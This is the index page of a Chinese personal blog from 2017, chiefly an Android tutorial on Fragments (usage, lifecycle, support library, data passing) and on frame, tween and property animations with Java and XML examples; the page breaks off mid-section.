<!doctype html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />






<meta name="description" content="人艰不拆">
<meta property="og:type" content="website">
<meta property="og:title" content="个人博客">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="个人博客">
<meta property="og:description" content="人艰不拆">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="个人博客">
<meta name="twitter:description" content="人艰不拆">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"hide"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title> 个人博客 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">个人博客</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/15/构建基类-BaseActivity/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/15/构建基类-BaseActivity/" itemprop="url">
                  构建基类--BaseActivity
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-15T10:21:00+08:00">
                2017-02-15
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>转载: <a href="http://blog.csdn.net/RaphetS/article/details/51327242" target="_blank" rel="external">http://blog.csdn.net/RaphetS/article/details/51327242</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/12-版本控制软件/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/12-版本控制软件/" itemprop="url">
                  12 版本控制软件
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:46:57+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h4 id="1-为什么要使用版本控制软件"><a href="#1-为什么要使用版本控制软件" class="headerlink" title="1 为什么要使用版本控制软件"></a>1 为什么要使用版本控制软件</h4><h4 id="2-虚拟机的创建"><a href="#2-虚拟机的创建" class="headerlink" title="2 虚拟机的创建"></a>2 虚拟机的创建</h4>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/13/12-版本控制软件/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/11-Fragment-动画/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/11-Fragment-动画/" itemprop="url">
                  11 Fragment 动画
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:46:29+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#一、Fragment</p>
<p>###1、为什么要使用fragment(Android 3.0 API 11 开始)</p>
<ul>
<li>适配大屏幕</li>
<li>用途：在一个Activity里切换界面，切换界面时只切换Fragment里面的内容<br>###2、如何使用fragment</li>
<li>fragment 理解成迷你activity，依托于activity存活，如果activity挂了，fragment也挂了。<ol>
<li>写一个类继承 Fragment </li>
<li>重写onCreateView()方法，返回当前fragement显示的view对象。</li>
</ol>
</li>
</ul>
<pre><code>        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                Bundle savedInstanceState) {
            //返回一个view对象
        }
3. 在activity获取Fragment01对象

          Fragment01 fg1 = new Fragment01();
3.1. 在activity获取到碎片管理器 FragmentManager

        FragmentManager fm = getFragmentManager();
4. 如果要更新界面要保证同时成功或者同时失败，开启事务

        FragmentTransaction ft = fm.beginTransaction();
5. 替换activity界面某个容器里面显示的内容（fragment）

        ft.replace(R.id.container, new Fragment03());
        ft.add();
        ft.remove();
6. 如果要更新界面要保证同时成功或者同时失败，提交事务

        ft.commit();
</code></pre><p>####2.1使用fragment细节</p>
<ul>
<li><p>写一个类继承 Fragment，并定义一个布局文件作为Fragment的显示内容(先要定义一个布局文件)</p>
<pre><code>public class Fragment01 extends Fragment {

    //与ListAdapter中的getView方法类似
    //此方法返回的View对象就是Fragment显示的内容
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {

        //用布局文件填充成一个View对象，返回出去，那么就显示在Fragment上了
        View view = inflater.inflate(R.layout.fragment01, null);

        return view ;
    }
}
</code></pre></li>
<li><p>把Fragment显示至指定ViewGroup中</p>
<pre><code>//把fragment显示至界面
//new出fragment对象
Fragment01 fg = new Fragment01();
FragmentManager fm = getFragmentManager();
//开启事务
FragmentTransaction ft = fm.beginTransaction();
//把fragment对象显示到指定资源id的组件里面
ft.replace(R.id.fl, fg);
ft.commit();
</code></pre><p>####2.2使用fragment示例</p>
<p>  //Activity界面显示fragment01<br>  public void click1(View v){</p>
<pre><code>//1 获取Fragment01对象，//Fragment01对象的onCreateView返回一个view对象
  Fragment01 fg1 = new Fragment01();
  //2.获取fragment管理器
  FragmentManager fm = getFragmentManager();
  //3.开启事务
  FragmentTransaction ft = fm.beginTransaction();
  //4.把fg1设置显示在帧布局中
  ft.replace(R.id.fl, fg1);
  //5.提交事务
  ft.commit();
</code></pre><p>  }</p>
</li>
</ul>
<p>###3、生命周期</p>
<ul>
<li>生命周期方法跟Activity一致，可以理解把其为就是一个Activity</li>
<li>fragment切换时会销毁旧的，再创建新的</li>
<li>fragment切换时旧fragment对象会销毁，新的fragment对象会被创建</li>
<li><p>完整生命周期</p>
<pre><code>oncreate--&gt;oncreateView--&gt;onstart--&gt;onresume--&gt;onpause---&gt;onstop---ondestroy
</code></pre></li>
<li><p>可视生命周期</p>
<pre><code>onstart--&gt;onresume--&gt;onpause---&gt;onstop
</code></pre></li>
<li><p>前台生命周期</p>
<pre><code>onresume--&gt;onpause
</code></pre></li>
</ul>
<p>###4、低版本兼容</p>
<ul>
<li>在support-v4.jar包中有相关api，也就是说fragment可以在低版本模拟器运行</li>
<li>使用 support-v4.jar包。包含有新版本sdk的API。<ol>
<li>替换所有的导包 android.app.<em> —&gt; android.support.v4.app.</em>;</li>
<li>继承activity的时候 换成 FragmentActivity </li>
<li>getFragmentManager() —&gt;getSupportFragmentManager();</li>
</ol>
</li>
<li>在实际开发当中，基本上使用的都是v4包里面的fragement</li>
</ul>
<p>–示例–</p>
<pre><code>import android.os.Bundle;

import android.support.v4.app.FragmentActivity;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.view.View;
import android.widget.LinearLayout;

public class MainActivity extends FragmentActivity {

    private Fragment01 fg1;
    private LinearLayout ll;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ll = (LinearLayout) findViewById(R.id.ll);
        //1 获取Fragment01对象
          fg1 = new Fragment01();
          //2.获取fragment管理器
          FragmentManager fm = getSupportFragmentManager();
          //3.开启事务
          FragmentTransaction ft = fm.beginTransaction();
          //4.把fg1设置显示在帧布局中
          ft.replace(R.id.fl, fg1);
          //5.提交事务
          ft.commit();

          //
          fg1.setLinearLayout(ll);
    }

    //显示fragment01  
    public void click1(View v){
        //1 获取Fragment01对象
          //Fragment01 fg1 = new Fragment01();
          //2.获取fragment管理器
          FragmentManager fm = getSupportFragmentManager();
          //3.开启事务
          FragmentTransaction ft = fm.beginTransaction();
          //4.把fg1设置显示在帧布局中
          ft.replace(R.id.fl, fg1);
          //5.提交事务
          ft.commit();
    }
    //显示fragment02
    public void click2(View v){
        //1 获取Fragment01对象
          Fragment02 fg2 = new Fragment02();
          //2.获取fragment管理器
          FragmentManager fm = getSupportFragmentManager();
          //3.开启事务
          FragmentTransaction ft = fm.beginTransaction();
          //4.把fg1设置显示在帧布局中
          ft.replace(R.id.fl, fg2);
          //5.提交事务
          ft.commit();
    }
    //显示fragment03
    public void click3(View v){
        //1 获取Fragment01对象
          Fragment03 fg3 = new Fragment03();
          //2.获取fragment管理器
          FragmentManager fm = getSupportFragmentManager();
          //3.开启事务
          FragmentTransaction ft = fm.beginTransaction();
          //4.把fg1设置显示在帧布局中
          ft.replace(R.id.fl, fg3);
          //5.提交事务
          ft.commit();
    }
}
</code></pre><p>###5、activity与fragement的数据传递</p>
<h4 id="5-1-从activity——-gt-Fragment数据传递"><a href="#5-1-从activity——-gt-Fragment数据传递" class="headerlink" title="5.1 从activity——-&gt;Fragment数据传递"></a>5.1 从activity——-&gt;Fragment数据传递</h4><ul>
<li><p>1 获取activity中EditView中的数据，通过Fragment对象调用方法传递数据</p>
<pre><code>public void click4(View v){

    //获取用户输入的数据
    EditText et_main = (EditText) findViewById(R.id.et_main);
    String text = et_main.getText().toString();
    //获取Fragment02对象
    Fragment02 fg2= new Fragment02();
    //调用Fragment02对象的setText()方法，将数据作为参数传递
    fg2.setText(text);
}
</code></pre></li>
<li><p>2 在Fragment中，获取方法传递过来的数据，并对数据进行操作</p>
<pre><code>public void setText(String text) {
    //获取传递过来的数据，并对数据进行操作
    //获取输入控件
    EditText tv_fragment2= (EditText) view.findViewById(R.id.tv_fragment2);
    //给输入控件设置数据，显示在桌面
    tv_fragment2.setText(text);
}
</code></pre><h4 id="5-1-从Fragment——-gt-activity数据传递"><a href="#5-1-从Fragment——-gt-activity数据传递" class="headerlink" title="5.1 从Fragment——-&gt;activity数据传递"></a>5.1 从Fragment——-&gt;activity数据传递</h4></li>
<li><p>1 在Fragment的java类中获取用户输入的数据，调用activity对象方法，传递数据</p>
<pre><code>//获取按钮控件
Button bt_fragment03 = (Button) view.findViewById(R.id.bt_fragment03);

//设置按钮点击事件，发送用户输入数据到activity
bt_fragment03.setOnClickListener(new OnClickListener() {

    @Override
    public void onClick(View v) {

        //查找EditText控件，得到用户输入数据
        EditText et = (EditText) view.findViewById(R.id.et);
        String text = et.getText().toString();

        //获取Activity对象，调用其.setText()方法，传递数据（作为参数传递）
        ((MainActivity)getActivity()).setText(text);
    }
});
</code></pre></li>
<li><p>2 在Activity中，获取方法传递过来的数据，并对数据进行操作</p>
<pre><code>public void setText(String text) {

    //查找EditText控件
    EditText et_main = (EditText) findViewById(R.id.et_main);
    //操作数据，将数据显示在桌面上
    et_main.setText(text);
}
</code></pre></li>
</ul>
<hr>
<p>#动画</p>
<p>###帧动画 FrameAnimation</p>
<blockquote>
<p>一张张图片不断的切换，形成动画效果</p>
<ul>
<li>1 在drawable-hdpi中添加一张张图片</li>
<li>2 在drawable目录下定义xml文件，子节点为animation-list，在这里定义要显示的图片和每张图片的显示时长</li>
<li>2.1 android:oneshot=”false” true表示一次，false表示重复多次</li>
</ul>
</blockquote>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;animation-list xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    android:oneshot=&quot;false&quot;
    &gt;
    &lt;item android:drawable=&quot;@drawable/g1&quot; android:duration=&quot;200&quot; /&gt;
    &lt;item android:drawable=&quot;@drawable/g2&quot; android:duration=&quot;200&quot; /&gt;
    &lt;item android:drawable=&quot;@drawable/g3&quot; android:duration=&quot;200&quot; /&gt;
    &lt;item android:drawable=&quot;@drawable/g4&quot; android:duration=&quot;200&quot; /&gt;
    &lt;item android:drawable=&quot;@drawable/g5&quot; android:duration=&quot;200&quot; /&gt;
    &lt;item android:drawable=&quot;@drawable/g6&quot; android:duration=&quot;400&quot; /&gt;
    &lt;item android:drawable=&quot;@drawable/g7&quot; android:duration=&quot;400&quot; /&gt;
    &lt;item android:drawable=&quot;@drawable/g8&quot; android:duration=&quot;400&quot; /&gt;
    &lt;item android:drawable=&quot;@drawable/g9&quot; android:duration=&quot;200&quot; /&gt;
    &lt;item android:drawable=&quot;@drawable/g10&quot; android:duration=&quot;200&quot; /&gt;
    &lt;item android:drawable=&quot;@drawable/g11&quot; android:duration=&quot;200&quot; /&gt;
&lt;/animation-list&gt;
</code></pre><ul>
<li><p>3 在屏幕上播放帧动画（先要在布局文件中设置ImageView），根据Drawable Animation文档写</p>
<pre><code>public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

    ImageView iv = (ImageView) findViewById(R.id.iv);
    //设置imageview的背景图//把动画文件设置为imageView的背景
    iv.setBackgroundResource(R.drawable.frameanimation);
    AnimationDrawable ad = (AnimationDrawable)iv.getBackground();
    //开始播放帧动画
    ad.start();

    }
}
</code></pre></li>
</ul>
<p>###补间动画(TweenAnimation)，实现ImageView(图片控件)的位移、旋转、缩放、透明</p>
<ul>
<li>原形态变成新形态时为了过渡变形过程，生成的动画就叫补间动画，不携带属性</li>
<li>位移、旋转、缩放、透明<br>#####ImageView(图片控件)的位移：</li>
<li>关于位移动画对象TranslateAnimation构造方法参数的详解</li>
<li><p>构造方法1：</p>
<pre><code>TranslateAnimation ta = new TranslateAnimation(10, 100, 20, 170);
</code></pre><ul>
<li>10：动画的x轴开始位置<ul>
<li>iv的x坐标+10</li>
</ul>
</li>
<li>100：动画的x轴结束位置<ul>
<li>iv的x坐标+100</li>
</ul>
</li>
<li>20：动画的y轴开始位置<ul>
<li>iv的y坐标 + 20</li>
</ul>
</li>
</ul>
</li>
<li><p>构造方法2.1:</p>
<pre><code>TranslateAnimation ta = new TranslateAnimation(Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 3, 
        Animation.RELATIVE_TO_SELF, 0, Animation.RELATIVE_TO_SELF, 0);
</code></pre><ul>
<li>0.5f:动画的x轴开始位置<ul>
<li>iv的x坐标 + 0.5 * iv宽度</li>
</ul>
</li>
<li>3：动画的x轴结束位置<ul>
<li>iv的x坐标 + 3 * iv的宽度</li>
</ul>
</li>
</ul>
</li>
<li><p>构造方法2.2:</p>
<pre><code>TranslateAnimation ta = new TranslateAnimation(Animation.RELATIVE_TO_PARENT, -0.5f, Animation.RELATIVE_TO_PARENT, 0.5f, 
        Animation.RELATIVE_TO_SELF, 0, Animation.RELATIVE_TO_SELF, 0);
</code></pre><ul>
<li>-0.5f:动画的x轴开始位置<ul>
<li>iv的x坐标 - 0.5 * 父元素的宽度</li>
</ul>
</li>
<li>0.5f：动画的x轴结束位置<ul>
<li>iv的x坐标 + 0.5 * 父元素的宽度</li>
</ul>
</li>
</ul>
</li>
<li><p>加深理解：对于上面的参数内容再解释一遍</p>
</li>
<li>构造1：</li>
<li>参数10指的是X的起点坐标，但不是指屏幕x坐标为10的位置，而是imageview的 真实X + 10</li>
<li><p>参数150指的是X的终点坐标，它的值是imageview的 真实X + 150</p>
<pre><code>//创建为位移动画对象，设置动画的初始位置和结束位置
TranslateAnimation ta = new TranslateAnimation(10, 150, 20, 140);
</code></pre></li>
<li>构造2：</li>
<li>x坐标的起点位置，如果相对于自己，传0.5f，那么起点坐标就是 真实X + 0.5 * iv宽度</li>
<li>x坐标的终点位置，如果传入2，那么终点坐标就是 真实X + 2 * iv的宽度</li>
<li>y坐标的起点位置，如果传入0.5f，那么起点坐标就是 真实Y + 0.5 * iv高度</li>
<li><p>y坐标的终点位置，如果传入2，那么终点坐标就是 真实Y + 2 * iv高度</p>
<pre><code>TranslateAnimation ta = new TranslateAnimation(Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 2, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 2);
</code></pre></li>
<li><p>动画播放相关的设置</p>
<pre><code>//设置动画持续时间
ta.setDuration(2000);
//动画重复播放的次数
ta.setRepeatCount(1);
//动画重复播放的模式
ta.setRepeatMode(Animation.REVERSE);
//动画播放完毕后，组件停留在动画结束的位置上
ta.setFillAfter(true);

anim.setInterpolator(new LinearInterpolator());// 匀速运动
anim.setRepeatCount(Animation.INFINITE);// 无限循环
//播放动画
iv.startAnimation(ta);
</code></pre></li>
<li><p>ImageView位移示例</p>
<pre><code>//Activity点击事件：位移补间动画
public void translate(View v){
    //创建位移动画对象，填入数据（两种构造，参数不同）
    //TranslateAnimation ta = new TranslateAnimation(10, 100, 20, 170);

    ta = new TranslateAnimation(Animation.RELATIVE_TO_PARENT, -0.5f, Animation.RELATIVE_TO_PARENT, 0.4f, 
            Animation.RELATIVE_TO_SELF, 0, Animation.RELATIVE_TO_SELF, 0);
    //动画持续时间
    ta.setDuration(2000);
    //设置播放重复次数
    //ta.setRepeatCount(1);
    //设置重复的模式
    //ta.setRepeatMode(Animation.REVERSE);
    //填充动画结束时的位置
    ta.setFillAfter(true);
    //播放动画
    iv.startAnimation(ta);
}
</code></pre><p>#####ImageView(图片控件)缩放：</p>
</li>
<li>关于缩放动画对象ScaleAnimation构造方法参数的详解</li>
<li><p>构造方法1：</p>
<pre><code>ScaleAnimation sa = new ScaleAnimation(0.5f, 2, 1, 3);
</code></pre><ul>
<li>0.5f：动画开始时的组件宽度<ul>
<li>0.5 * iv的宽度</li>
</ul>
</li>
<li>2：动画结束时的组件宽度<ul>
<li>2 * iv的宽度</li>
</ul>
</li>
</ul>
</li>
<li><p>构造方法2：</p>
<pre><code>ScaleAnimation sa = new ScaleAnimation(0.5f, 2, 2, 0.5f, iv.getWidth() / 2, iv.getHeight() / 2);
</code></pre><ul>
<li>iv.getWidth() / 2：缩放点的x坐标<ul>
<li>iv的x坐标 + iv.getWidth() / 2</li>
</ul>
</li>
</ul>
</li>
<li><p>构造方法3：</p>
<pre><code>ScaleAnimation sa = new ScaleAnimation(0.5f, 2, 2, 0.5f, 
        Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f);
</code></pre><ul>
<li>Animation.RELATIVE_TO_SELF, 0.5f：缩放点的x坐标<ul>
<li>iv的x坐标 + 0.5 * iv的宽度</li>
</ul>
</li>
</ul>
</li>
<li><p>构造方法1：</p>
</li>
<li>参数0.1f表示动画的起始宽度是真实宽度的0.1倍</li>
<li>参数4表示动画的结束宽度是真实宽度的4倍</li>
<li><p>缩放的中心点在iv左上角</p>
<pre><code>ScaleAnimation sa = new ScaleAnimation(0.1f, 4, 0.1f, 4);
</code></pre></li>
<li>构造方法3：</li>
<li>参数0.1f和4意义与上面相同</li>
<li>改变缩放的中心点：传入的两个0.5f，类型都是相对于自己，这两个参数改变了缩放的中心点</li>
<li>中心点x坐标 = 真实X + 0.5 * iv宽度</li>
<li><p>中心点Y坐标 = 真实Y + 0.5 * iv高度</p>
<pre><code>ScaleAnimation sa = new ScaleAnimation(0.1f, 4, 0.1f, 4, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f);
</code></pre></li>
<li><p>缩放示例</p>
<pre><code>//Activity点击事件：缩放补间动画
public void scale(View v){
    //ScaleAnimation sa = new ScaleAnimation(0.5f, 2, 1, 3);
    //ScaleAnimation sa = new ScaleAnimation(0.5f, 2, 2, 0.5f, iv.getWidth() / 2, iv.getHeight() / 2);

    sa = new ScaleAnimation(0.5f, 2, 2, 0.5f, 
            Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f);
    sa.setDuration(2000);
    //设置播放重复次数
    sa.setRepeatCount(1);
    //设置重复的模式
    sa.setRepeatMode(Animation.REVERSE);
    //填充动画结束时的位置
    sa.setFillAfter(true);
    //播放动画
    iv.startAnimation(sa);
}
</code></pre><p>#####ImageView(图片控件)透明：</p>
</li>
<li><p>0为完全透明，1为完全不透明。(0, 0.5f)表示有完全透明转为1/2透明</p>
<pre><code>AlphaAnimation aa = new AlphaAnimation(0, 0.5f);
</code></pre></li>
<li><p>ImageView(图片控件)透明示例</p>
<pre><code>//Activity点击事件：透明补间动画
public void alpha(View v){
    aa = new AlphaAnimation(0.1f, 0.9f);
    aa.setDuration(2000);
    //设置播放重复次数
    aa.setRepeatCount(1);
    //填充动画结束时的位置
    aa.setFillAfter(true);
    iv.startAnimation(aa);
}
</code></pre></li>
</ul>
<p>#####ImageView(图片控件)旋转：</p>
<ul>
<li>关于旋转动画对象RotateAnimation构造方法参数的详解</li>
<li><p>构造方法2：</p>
<pre><code>RotateAnimation ra = new RotateAnimation(10, 360, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f);
</code></pre><ul>
<li>10:动画开始时的角度</li>
<li>360：动画结束时的角度</li>
</ul>
</li>
<li><p>构造方法1：</p>
</li>
<li>20表示动画开始时的iv的角度(20是相对于最初iv的角度)</li>
<li>360表示动画结束时iv的角度(360是相对于最最最初iv的角度)</li>
<li>默认旋转的圆心在iv左上角</li>
<li><p>如下</p>
<pre><code>RotateAnimation ra = new RotateAnimation(20, 360);
</code></pre></li>
<li>构造方法2：</li>
<li>20,360的意义和上面一样</li>
<li>指定圆心坐标，相对于自己，值传入0.5，那么圆心的x坐标：真实X + iv宽度 * 0.5</li>
<li>圆心的Y坐标：真实Y + iv高度 * 0.5</li>
<li><p>如下：</p>
<pre><code>RotateAnimation ra = new RotateAnimation(20, 360, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f);
</code></pre></li>
<li><p>ImageView(图片控件)旋转示例：</p>
<pre><code>//Activity点击事件：旋转补间动画
public void rotate(View v){
    //RotateAnimation ra = new RotateAnimation(10, 180);
    //RotateAnimation ra = new RotateAnimation(10, 360, iv.getWidth() / 2, iv.getHeight() / 2);
    //旋转动画对象RotateAnimation
    ra = new RotateAnimation(10, 360, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f);
    ra.setDuration(2000);
    //设置播放重复次数
    ra.setRepeatCount(1);
    //设置重复的模式
    ra.setRepeatMode(2);
    ra.setFillAfter(true);
    iv.startAnimation(ra);
}
</code></pre><p>#####所有动画一起飞</p>
<pre><code>//Activity点击事件：补间动画一起飞    
public void fly(View v){
    //创建动画集合
    AnimationSet as = new AnimationSet(false);//true:共用同一个插补器,false:各用个的插补器
    //添加动画至集合
    as.addAnimation(ta);
    as.addAnimation(sa);
    as.addAnimation(aa);
    as.addAnimation(ra);

    //播放动画集合中所有动画
    iv.startAnimation(as);
}
</code></pre></li>
</ul>
<hr>
<p>#属性动画PropertyAnimation</p>
<ul>
<li>补间动画，只是一个动画效果，组件其实还在原来的位置上，xy没有改变</li>
<li>属性动画改变组件对象的属性值<br>###位移：</li>
<li>改变x或者y坐标属性</li>
<li>第一个参数target指定要显示动画的组件</li>
<li>第二个参数propertyName指定要改变组件的哪个属性</li>
<li>第三个参数values是可变参数，就是赋予属性的新的值</li>
<li>传入0，代表x起始坐标：当前x + 0</li>
<li><p>传入100，代表x终点坐标：当前x + 100</p>
<pre><code>//具有get、set方法的成员变量就称为属性
ObjectAnimator oa = ObjectAnimator.ofFloat(bt, &quot;translationX&quot;, 0, 100) ;
</code></pre></li>
<li><p>位移示例</p>
<pre><code>//Activity点击事件：位移属性动画
public void translate(View v){
    //创建属性动画师
    //arg0:要修改的对象
    //arg1:要修改对象的哪个属性
    //arg2:可变参数 要把属性改成什么值
    ObjectAnimator oa = ObjectAnimator.ofFloat(iv, &quot;translationX&quot;, 0, 50, -50, 100);
    oa.setDuration(2000);
    //设置播放重复次数
    //oa.setRepeatCount(1);
    //设置重复的模式（参数可以用1默认，2倒放模式表示）
    //oa.setRepeatMode(ObjectAnimator.REVERSE);
    oa.start();
}
</code></pre><p>###缩放：</p>
</li>
<li>改变scaleX或scaleY的属性</li>
<li>scaleX：水平缩放比例</li>
<li><p>scaleY：竖直缩放比例</p>
</li>
<li><p>第三个参数指定缩放的比例</p>
</li>
<li>0.1是从原本高度的十分之一开始</li>
<li><p>2是到原本高度的2倍结束</p>
<pre><code>ObjectAnimator oa = ObjectAnimator.ofFloat(bt, &quot;scaleY&quot;, 0.1f, 2);
</code></pre></li>
<li><p>缩放示例</p>
<pre><code>//Activity点击事件：缩放属性动画
public void scale(View v){
    //创建属性动画师
    //arg0:要修改的对象
    //arg1:要修改对象的哪个属性
    //arg2:可变参数 要把属性改成什么值
    ObjectAnimator oa = ObjectAnimator.ofFloat(iv, &quot;scaleX&quot;, 0.5f, 1, 0.3f, 2);
    oa.setDuration(2000);
    oa.start();
}
</code></pre><p>###透明：</p>
</li>
